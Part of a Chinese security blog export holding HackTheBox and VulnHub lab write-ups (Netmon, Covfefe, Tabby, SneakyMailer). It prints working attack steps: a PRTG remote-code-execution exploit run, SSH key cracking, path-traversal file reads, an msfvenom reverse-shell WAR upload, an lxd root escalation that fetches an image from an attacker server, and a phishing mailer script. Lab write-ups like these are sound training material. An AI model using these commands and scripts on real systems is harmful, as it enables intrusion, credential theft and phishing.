<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><p>ftp可以直接匿名访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ftp 10.129.1.126</span><br><span class="line">Connected to 10.129.1.126.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.1.126:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password:</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt; cd Users</span><br><span class="line">250 CWD command successful.</span><br><span class="line">ftp&gt; cd Public</span><br><span class="line">250 CWD command successful.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Documents</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          Downloads</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          Music</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          Pictures</span><br><span class="line">02-03-19  12:35AM                   33 user.txt</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          Videos</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls -la</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">11-20-16  10:46PM       &lt;DIR&gt;          $RECYCLE.BIN</span><br><span class="line">02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">11-20-16  09:59PM               389408 bootmgr</span><br><span class="line">07-16-16  09:10AM                    1 BOOTNXT</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">10-21-20  02:39AM            738197504 pagefile.sys</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          ProgramData</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Recovery</span><br><span class="line">02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information</span><br><span class="line">10-21-20  05:56AM       &lt;DIR&gt;          Users</span><br><span class="line">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; cd ProgramData</span><br><span class="line">250 CWD command successful.</span><br><span class="line">.......</span><br><span class="line">ftp&gt; cd Paessler</span><br><span class="line">...... .</span><br><span class="line">ftp&gt; cd &quot;PRTG Network Monitor&quot;</span><br><span class="line">250 CWD command successful.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">10-21-20  02:39AM       &lt;DIR&gt;          Configuration Auto-Backups</span><br><span class="line">10-21-20  02:39AM       &lt;DIR&gt;          Log Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Debug)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (Sensors)</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          Logs (System)</span><br><span class="line">10-21-20  02:39AM       &lt;DIR&gt;          Logs (Web Server)</span><br><span class="line">10-21-20  02:45AM       &lt;DIR&gt;          Monitoring Database</span><br><span class="line">02-25-19  10:54PM              1189697 PRTG Configuration.dat</span><br><span class="line">10-21-20  06:00AM              1216685 PRTG Configuration.old</span><br><span class="line">07-14-18  03:13AM              1153755 PRTG Configuration.old.bak</span><br><span class="line">10-21-20  06:09AM              1712361 PRTG Graph Data Cache.dat</span><br><span class="line">02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          System Information Database</span><br><span class="line">02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database</span><br><span class="line">02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>将配置文件下载下来之后发现PRTG Configuration.old.bak有记载明文。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021181923520.png" alt="image-20201021181923520"></p>
<p>密码里面有年份，简单的用2016-2020中的数字尝试替换，结果2019成功了。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021182032384.png" alt="image-20201021182032384"></p>
<p>谷歌搜到了一个<a href="https://www.exploit-db.com/exploits/46527" target="_blank" rel="noopener">exp</a>，脚本下载下来是dos格式的，需要用<code>dos2unix</code>转换一下。成功执行需要cookie。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash 46527.sh -u http:&#x2F;&#x2F;10.129.1.126 -c &quot;OCTOPUS1813713946&#x3D;ezhCNUUxNjJGLTVFMDAtNEQ1Ri1BQkY3LTM1Q0Y0NTFBMzJDNH0%3D&quot;</span><br><span class="line"></span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line">[*] Authenticated PRTG network Monitor remote code execution                [*] </span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line">[*] Date: 11&#x2F;03&#x2F;2019                                                        [*] </span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line">[*] Author: https:&#x2F;&#x2F;github.com&#x2F;M4LV0   lorn3m4lvo@protonmail.com            [*] </span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line">[*] Vendor Homepage: https:&#x2F;&#x2F;www.paessler.com&#x2F;prtg                          [*] </span><br><span class="line">[*] Version: 18.2.38                                                        [*] </span><br><span class="line">[*] CVE: CVE-2018-9276                                                      [*] </span><br><span class="line">[*] Reference: https:&#x2F;&#x2F;www.codewatch.org&#x2F;blog&#x2F;?p&#x3D;453                        [*] </span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line"></span><br><span class="line"># login to the app, default creds are prtgadmin&#x2F;prtgadmin. once athenticated grab your cookie and use it with the script.</span><br><span class="line"># run the script to create a new user &#39;pentest&#39; in the administrators group with password &#39;P3nT3st!&#39; </span><br><span class="line"></span><br><span class="line">[+]#########################################################################[+] </span><br><span class="line"></span><br><span class="line"> [*] file created </span><br><span class="line"> [*] sending notification wait....</span><br><span class="line"></span><br><span class="line"> [*] adding a new user &#39;pentest&#39; with password &#39;P3nT3st&#39; </span><br><span class="line"> [*] sending notification wait....</span><br><span class="line"></span><br><span class="line"> [*] adding a user pentest to the administrators group </span><br><span class="line"> [*] sending notification wait....</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> [*] exploit completed new user &#39;pentest&#39; with password &#39;P3nT3st!&#39; created have fun!</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ evil-winrm -i 10.129.1.126 -u pentest</span><br><span class="line">Enter Password: </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\pentest\Documents&gt; whoami</span><br><span class="line">netmon\pentest</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</span><br><span class="line">3018977fb944bf1878f75b879fba67cc</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Omni</title>
    <url>/2020/12/23/HackTheBox-Omni/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系，密码：Administrator的nthash：a0****f00。" /><label>活跃机器，只做记录，如果需要提示，请邮件联系，密码：Administrator的nthash：a0****f00。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9996d05013a5205faa813c34c9acc8c1ff71f22c45f455523aba0e720c46f25a"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows Iot Core</tag>
        <tag>SirepRAT</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-OpenKeyS</title>
    <url>/2020/11/27/HackTheBox-OpenKeyS/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系。" /><label>活跃机器，只做记录，如果需要提示，请邮件联系。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f960fe98600955f602450d534d8657e5317a55d7670f9dd55244b8a3805c6797"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>OpenBSD</tag>
        <tag>CVE-2019-19521</tag>
        <tag>CVE-2019-19520</tag>
        <tag>CVE-2019-19522</tag>
      </tags>
  </entry>
  <entry>
    <title>Covfefe</title>
    <url>/2020/04/18/Covfefe/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本篇涉及ssh解密，内存溢出。<br>靶机难度:简单</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>对目标靶机进行nmap扫描<br><code>nmap 192.168.2.140 -T5 -vv -A -sC -p- --script vuln -oN covfefe.nmap</code></p>
<p>可以发现目标机器打开了<br><code>80端口</code>同时我们可以观察到它的服务版本属于nginx<br><code>31337端口</code>是一个python脚本的轻量web<br><code>22端口</code> openssh7.4p1</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_211911.jpg" alt="nmap信息"></p>
<p>先进去网站看看。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200417_204951.jpg" alt="80nginx"><br>没什么好看的，用dirb扫了一下网站路径也扫不出来。</p>
<p>把目标转到<code>31337端口</code>上</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_205449.jpg" alt="404-notfound"></p>
<p>虽然是404页面，但是如果用dirb扫一下的话，可以轻易的发现还是有些文件的，而且网站的根目录极有可能就在用户的家目录下</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_205652.jpg" alt="path1"></p>
<p>访问一下<code>http://192.168.2.140:31337/robots.txt</code>看看能不能抓取更多信息。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_212121.jpg" alt="robots"></p>
<p>进去/taxes目录，找到我们的第一个flag。</p>
<p>根据dirb扫出来的目录信息，我们可以直接下载目标机器的<code>id_rsa</code>文件。<br>还有其他的文件，也可以下载下来看看，但是找不到什么有用的信息。根据<code>id_rsa.pub</code>文件可以看到目标的用户名是<code>simon</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_213847.jpg" alt="simon"></p>
<h3 id="ssh密码解密"><a href="#ssh密码解密" class="headerlink" title="ssh密码解密"></a>ssh密码解密</h3><p>先尝试登录，但是很遗憾还是提示要密码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200417_214110.jpg" alt="ssh"><br>使用工具解密SSH密码<br>使用<code>ssh2john</code>解密出私钥密码的hash值.</p>
<p>格式<br><code>python ssh2john [hash_file]</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_193756.jpg" alt="ssh2john_1"></p>
<p>使用他这段哈希值用john爆破.</p>
<p>john –wordlist=[wordlist_file] [hash_file]</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_194150.jpg" alt="john"></p>
<p>得出密码为<code>starwars</code></p>
<p>进去系统后，先进行信息枚举,找到系统里有的SUID位文件</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_214352.jpg" alt="suid"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>可以发现一个<code>read_message</code>的二进制文件<br>执行一下</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_214622.jpg" alt="read_message"></p>
<p>没发现什么有趣的东西，先进去<code>/root</code>下面可以看到我们的<code>flag.txt</code></p>
<p>但是查看不了，提示我们没有权限。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_214752.jpg" alt="asd"></p>
<p>拿到flag2</p>
<p>观察这个源代码，会发现他可能可以溢出，执行一下。<br>输入<br><code>SimonAAAAAAAAAAAAAAA/bin/sh</code><br>因为它的长度是20，simon占了5位，给他填满15位的字符，后面就是我们要用到的执行语句了，只要执行了就能进入到root用户的shell权限了。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在做这个靶机之前，拿到ssh私钥都不知道还要解密这一回事。。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>john</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Tabby</title>
    <url>/2020/10/21/HackTheBox-Tabby/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>Name:Tabby</li>
<li>IP: 10.10.10.194</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/image-20201021131717843.png" alt="image-20201021131717843"></p>
<p>实际上是很久之前做的了，一直没发。。很有意思的靶机，枚举多一点。</p>
<a id="more"></a>



<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p><img src="https://images.atsud0.me/images/post/image-20201021131849590.png" alt="image-20201021131849590"></p>
<p>开放的端口:22,80,8080</p>
<p>访问网站的话，就会留意到一个链接有域名，并且看起来很像是文件包含。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021131948421.png" alt="image-20201021131948421"></p>
<p>在/etc/hosts中添加进去。再次访问。输入file=/etc/passwd探测的时候返回空白页面，然后使用../files/statement也能返回页面，所以尝试目录遍历的方式包含的话就可以了<code>file=../../../../etc/passwd</code></p>
<p>成功返回/etc/passwd内容（我这边图糊了，就不放图了。。</p>
<p>之后接下来的思路是：包含tomcat的用户页面（因为有tomcat的服务，并且在/etc/passwd看到了tomcat的路径），然后登录tomcat的管理面板，最后上传恶意war脚本，反弹shell。</p>
<h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>但是接下来无论如何我都读不到/opt/tomcat下面的配置文件，猜测为以下原因</p>
<ol>
<li>权限不够 </li>
<li>tomcat的文件路径不在tomcat家目录下。尝试读取tomcat.service后发现。tomcat指定的家路径为/opt/tomcat/latest/ </li>
</ol>
<p><img src="https://images.atsud0.me/images/post/image-20201021132524646.png" alt="image-20201021132524646"></p>
<p>但是之后我尝试读/opt/tomcat/latest/conf/tomcat-users.xml也不行，我猜测可能不是编译安装所以找不到网络上的所说的配置文件，有可能是包管理的形式安装的tomcat。所以去搜索了一下包管理方式安装tomcat的配置文件的<a href="https://ubuntu.pkgs.org/20.04/ubuntu-universe-amd64/tomcat9_9.0.31-1_all.deb.html" target="_blank" rel="noopener">默认路径</a>。最后成功读到用户名和密码</p>
<p><img src="https://images.atsud0.me/images/post/tabby-tomcat.png" alt="tabby-tomcat"></p>
<p>但是结果显然是让我失望的，因为该tomcat用户并不属于manager-gui组。所以并不能通过直接登陆面板的方式来部署恶意脚本。host-manager虽然有个弹shell的方法，但是只适用与windows的服务器。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021132956577.png" alt="image-20201021132956577"></p>
<p>最后通过查阅tomcat的文档，发现其实manager-script角色组也能上传部署war，和管理这个的，只是没有GUI的窗口。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021133044167.png" alt="image-20201021133044167"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -u <span class="string">'tomcat'</span>:<span class="string">'$3cureP4s5w0rd123!'</span> <span class="string">'http://10.10.10.194:8080/manager/text/list # 获取已经部署的应用</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">## 通过阅读文档，知道了 有三个参数 update,tag,config。但是我们只需要上传就可以了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msfvenom -p java/shell_reverse_tcp LHOST=Your_IP LPORT=port -f war -o /tmp/shell.war</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">curl -u '</span>tomcat<span class="string">':'</span><span class="variable">$3cureP4s5w0rd123</span>!<span class="string">' '</span>http://10.10.10.194:8080/manager/text/deploy?path=/shell&amp;update=<span class="literal">true</span><span class="string">' --upload-file /tmp/shell.war</span></span><br></pre></td></tr></table></figure>

<p>上传之后本地监听设置的端口，访问部署后的路径即可。</p>
<h2 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a>0x02 提权</h2><p>获取到tomcat用户的shell后，搜索一番，发现/var/www/html/files下有一个zip文件，下载下来解压但是需要密码，我使用tomcat用户的密码和尝试一些简单的密码，都不行。使用zip2john导出zip的hash，使用john爆破。<br><img src="https://images.atsud0.me/images/post/image-20201021133330100.png" alt="image-20201021133330100"></p>
<p>解压出来的东西没用，但是解压密码能登陆ash用户。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021133403739.png" alt="image-20201021133403739"></p>
<p><img src="https://images.atsud0.me/images/post/image-20201021133420659.png" alt="image-20201021133420659"></p>
<p>接下来正常照lxd的提权流程进行就好了，需要注意的是导入镜像需要在用户的家目录下导入，否则一直会提示找不到文件。还有一点需要注意的是靶机上面没有<code>lxc storage</code>，所以一开始导入好了接着往下执行的话就会提示失败，需要先<code>lxd init</code>创建一个<code>storage spool</code>才可以。提权步骤如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 攻击机器上执行</span></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此命令必须以root用户执行，之后会生成一个tar.gz的压缩包。</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标系统中执行</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">wget http://Your-Vps-IP/alpine-v3.12-x86_64-20200908_2138.tar.gz -O /tmp/alpine-v3.12.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.12.tar.gz --<span class="built_in">alias</span> alpine-v3.12</span><br><span class="line">lxd init <span class="comment">##交互性的确认。全部默认，除了问名字的时候输入ignite。</span></span><br><span class="line">lxc init alpine-v3.12 ignite -c security.privileged=<span class="literal">true</span>  <span class="comment">##如果没有执行过lxd init，这里会报错。</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br></pre></td></tr></table></figure>

<p>最后只要cd到/mnt/root下就是靶机的文件了</p>
<p><img src="https://images.atsud0.me/images/post/image-20201021133553095.png" alt="image-20201021133553095"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>tomcat</tag>
        <tag>lxd</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Passage</title>
    <url>/2021/01/24/HackTheBox-Passage/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系，密码：$6$m*****TW0" /><label>活跃机器，只做记录，如果需要提示，请邮件联系，密码：$6$m*****TW0</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="15d46921be76286d8be56c6a98a66fbcef6cf1946cb401cd0e51659dfeda5572"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu-Desktop</tag>
        <tag>USB-creator</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-SneakyMailer</title>
    <url>/2020/11/27/HackTheBox-SneakyMailer/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>NAME:SneakyMailer</li>
<li>IP: 10.10.10.197 </li>
<li>Difficulty:Medium</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/image-20201127004801114.png" alt="image-20201127004801114"></p>
<a id="more"></a>


<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namp -p- sneakycorp.htb</span><br><span class="line">nmap -p80..... -sC -sV sneakycorp.htb</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201125103827977.png" alt="image-20201125103827977"></p>
<h3 id="directory-busting"><a href="#directory-busting" class="headerlink" title="directory busting"></a>directory busting</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sneakycorp.htb</span><br><span class="line"></span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;img (Status: 301)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;team.php (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;vendor (Status: 301)</span><br><span class="line">&#x2F;pypi (Status: 301)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;sneakycorp.htb&#x2F;pypi</span><br><span class="line"></span><br><span class="line">&#x2F;register.php (Status: 200)</span><br></pre></td></tr></table></figure>



<h3 id="Subdomain-burting"><a href="#Subdomain-burting" class="headerlink" title="Subdomain burting"></a>Subdomain burting</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hl 7 -H <span class="string">"Host: FUZZ.sneakycorp.htb"</span> -u http://sneakycorp.htb -t 100</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201125105502583.png" alt="image-20201125105502583"></p>
<p>发现<code>dev</code>子域名</p>
<h3 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EHLO localhost</span><br><span class="line">250-debian</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250-DSN</span><br><span class="line">250-SMTPUTF8</span><br><span class="line">250 CHUNKING</span><br><span class="line">HELO localhost</span><br><span class="line">AUTH LOGIN</span><br><span class="line">503 5.5.1 Error: authentication not enable</span><br></pre></td></tr></table></figure>

<p>EHLO 和VRFY都能用，但是禁用了AUTH 所以爆破也没用，尝试了一下也能直接发送邮件（伪造发件人（钓鱼可能性微存。。</p>
<h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p>这个也是，，直接nc进去不能登陆。估计得用专门的邮件客户端。</p>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p>匿名用户登陆失败。</p>
<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>访问<a href="http://sneakycorp.htb" target="_blank" rel="noopener">http://sneakycorp.htb</a> 我们可以知道目标的邮件后缀</p>
<p><img src="https://images.atsud0.me/images/post/image-20201125105650491.png" alt="image-20201125105650491"></p>
<ul>
<li>sneakymailer.htb</li>
</ul>
<p>从前面发现的dev的子域名，访问后，左侧多了一个注册按钮，点击后跳转注册页面，也就是前面目录扫描/pypi/扫到的，但是提交没反应。</p>
<h3 id="http-8080"><a href="#http-8080" class="headerlink" title="http-8080"></a>http-8080</h3><p>就一个<code>nginx</code>默认页面</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="smtp-钓鱼邮件"><a href="#smtp-钓鱼邮件" class="headerlink" title="smtp 钓鱼邮件"></a>smtp 钓鱼邮件</h3><p>手写了一个<code>python</code>脚本来发送邮件，先提取所有的邮件地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://dev.sneakycorp.htb/team.php |grep -oE <span class="string">'&lt;td&gt;.*@sneakymailer.htb&lt;/td&gt;'</span> &gt; emails.txt</span><br></pre></td></tr></table></figure>

<p>Python发送邮件代码如下，发送之前记得先开个nc监听1234端口（（为什么不用sweak啊，因为没用过啊。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">from_mail = <span class="string">'admin@sneakymailer.htb'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mail</span><span class="params">(to_mail)</span>:</span></span><br><span class="line">    msg = MIMEText(<span class="string">"Port Report,Please Check&lt;img src='http://Your-IP:1234/a.jpg'&gt;asdasd&lt;/img&gt;ASDASD&lt;p&gt;sdsdsdsdsd&lt;/p&gt;"</span>, <span class="string">"html"</span>, <span class="string">"utf-8"</span>)</span><br><span class="line">    content_part = msg</span><br><span class="line">    m = MIMEMultipart()</span><br><span class="line">    m.attach(content_part)</span><br><span class="line">    m[<span class="string">'Subject'</span>] = <span class="string">'Port Report - Week'</span></span><br><span class="line">    m[<span class="string">'From'</span>] = from_mail</span><br><span class="line">    m[<span class="string">'To'</span>] = to_mail</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = smtplib.SMTP(<span class="string">'10.10.10.197'</span>, port=<span class="string">'25'</span>)</span><br><span class="line">        server.sendmail(from_mail, to_mail.split(<span class="string">','</span>), m.as_string())</span><br><span class="line">        print(<span class="string">'&#123;&#125; success'</span>.format(to_mail))</span><br><span class="line">        server.quit()</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'error:'</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(file=<span class="string">'emails.txt'</span>,mode=<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">       to_mail=f.readlines()</span><br><span class="line"></span><br><span class="line">    new_tomail=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> to_mail:</span><br><span class="line">       a = re.findall(<span class="string">'&lt;td&gt;(.*?)&lt;/td&gt;'</span>, i)</span><br><span class="line">       a= <span class="string">''</span>.join(a)</span><br><span class="line">       new_tomail.append(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> new_tomail:</span><br><span class="line">       write_mail(i)</span><br><span class="line">    print(<span class="string">'All Jobs is Done!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201126005914799.png" alt="image-20201126005914799"></p>
<p>解码之后</p>
